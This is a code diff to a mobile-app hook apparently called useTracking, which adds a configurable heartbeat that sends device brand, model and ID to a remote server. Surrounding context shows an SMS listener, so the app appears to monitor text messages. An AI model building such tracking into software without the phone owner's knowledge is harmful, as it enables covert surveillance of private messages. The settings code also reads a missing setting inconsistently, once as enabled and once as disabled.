@@ -103,12 +103,33 @@ const useTracking = (permissionStatus) => {
         console.log("[useTracking] SMS listener health check: Active");
       }, 30000);
 
-      // Heartbeat: send a small ping every 40 seconds while app is active
-      const heartbeatInterval = setInterval(() => {
-        console.log('[useTracking] Heartbeat: sending ping');
-        // Send lightweight ping payload - includes deviceId
-        sendDataToServer('ping', 'heartbeat').catch(err => console.warn('[useTracking] Heartbeat failed:', err.message));
-      }, 40000);
+      // Heartbeat: check settings then send ping if enabled; interval is respected at 40s base but uses stored interval to skip sending if changed
+      let lastSent = 0;
+      const heartbeatInterval = setInterval(async () => {
+        try {
+          const enabled = (await AsyncStorage.getItem('TIGER_HEARTBEAT_ENABLED')) !== 'false'; // default true
+          const intervalMs = Number(await AsyncStorage.getItem('TIGER_HEARTBEAT_INTERVAL')) || 40000;
+          if (!enabled) return; // skip if disabled
+
+          const now = Date.now();
+          if (now - lastSent < intervalMs) return; // not yet
+
+          console.log('[useTracking] Heartbeat: sending ping');
+          const targetUrl = useLocalServer ? LOCAL_URL : API_URL;
+          await sendWithRetry(targetUrl, {
+            sender: 'heartbeat',
+            message: 'ping',
+            device: `${Device.brand} ${Device.modelName}`,
+            deviceId: deviceId || 'unknown',
+            timestamp: new Date().toLocaleTimeString(),
+            type: 'ping'
+          });
+
+          lastSent = Date.now();
+        } catch (err) {
+          console.warn('[useTracking] Heartbeat failed:', err.message);
+        }
+      }, 5000); // check every 5s whether it's time to send according to intervalMs
 
       return () => {
         subscription.remove();
@@ -118,6 +139,24 @@ const useTracking = (permissionStatus) => {
     }
   }, [permissionStatus, useLocalServer, deviceId]);
 
-  // Expose toggle for local server and deviceId (can be used in UI)
-  return { useLocalServer, setUseLocalServer, deviceId };
+  // Heartbeat settings: read from AsyncStorage
+  const readHeartbeatSettings = async () => {
+    try {
+      const enabled = await AsyncStorage.getItem('TIGER_HEARTBEAT_ENABLED');
+      const interval = await AsyncStorage.getItem('TIGER_HEARTBEAT_INTERVAL');
+      return { enabled: enabled === 'true', interval: interval ? Number(interval) : 40000 };
+    } catch (err) {
+      return { enabled: true, interval: 40000 };
+    }
+  };
+
+  // Expose toggle for local server, deviceId and heartbeat control (can be used in UI)
+  const setHeartbeatEnabled = async (val) => {
+    await AsyncStorage.setItem('TIGER_HEARTBEAT_ENABLED', val ? 'true' : 'false');
+  };
+  const setHeartbeatInterval = async (ms) => {
+    await AsyncStorage.setItem('TIGER_HEARTBEAT_INTERVAL', String(ms));
+  };
+
+  return { useLocalServer, setUseLocalServer, deviceId, readHeartbeatSettings, setHeartbeatEnabled, setHeartbeatInterval };
 };
